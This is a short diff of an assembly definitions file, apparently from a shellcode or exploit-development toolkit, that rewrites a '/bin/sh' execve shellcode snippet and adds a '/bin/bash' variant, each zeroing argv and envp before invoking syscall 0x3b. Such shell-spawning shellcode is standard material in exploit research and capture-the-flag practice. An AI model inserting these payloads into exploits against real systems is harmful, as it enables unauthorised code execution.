@@ -1,20 +1,21 @@
 [[data]]
 PROGRAM_BIN_SH: "/bin/sh"
+PROGRAM_BIN_BASH: "/bin/bash"
+
 
 [[code]]
 [bin_sh]
 # Zero-out argv and envp
 xor rdx, rdx
 xor rsi, rsi
+mov rdi, PROGRAM_BIN_SH
+mov eax, 0x3b
+syscall
 
-mov rcx, [rel PROGRAM_BIN_SH]
-
-# Insert NULL-byte
-shl rcx, 0x08
-shr rcx, 0x08
-
-# Push to stack, then copy literal string
-push rcx
-lea rdi, [rsp]
+[bin_bash]
+# Zero-out argv and envp
+xor rdx, rdx
+xor rsi, rsi
+mov rdi, PROGRAM_BIN_BASH
 mov eax, 0x3b
 syscall
